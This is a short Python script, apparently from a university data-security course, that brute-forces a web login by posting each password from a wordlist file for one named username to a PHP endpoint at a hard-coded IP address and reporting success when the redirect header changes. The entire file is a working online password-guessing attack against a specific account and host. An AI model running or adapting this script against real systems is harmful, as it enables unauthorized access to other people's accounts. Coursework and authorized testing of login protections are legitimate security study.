import requests

# Configuration
login_url = "http://158.39.188.211/functions/passcheck.php"
username = "tomhnatt"
password_file_path = "/Users/stefan/Documents/Dev/Informatikk_HIOF/Datasikkerhet/password_combinations.txt"
redirect_indicator = "redir.php?pgid="  # Refined success indicator

# Function to attempt login with a given password
def attempt_login(password):
    data = {
        'username': username,
        'password': password,
    }
    response = requests.post(login_url, data=data, allow_redirects=False)
    # Check the Location header to see if it contains the unique pgid parameter
    location_header = response.headers.get('Location', '')
    if redirect_indicator in location_header:
        print(f"Success! Password is: {password}")
        return True
    return False

# Main logic
counter = 0
with open(password_file_path, 'r') as file:
    for line in file:
        password = line.strip()
        counter += 1
        if counter % 100 == 0:  # Print a message every 100 attempts to show progress
            print(f"Attempted {counter} passwords. Current: {password}")
        if attempt_login(password):
            print(f"Found successful password: {password}")
            break
    else:
        # This else clause belongs to the for loop and is executed when the loop completes normally (no breaks)
        print("Completed all attempts. No solution found.")
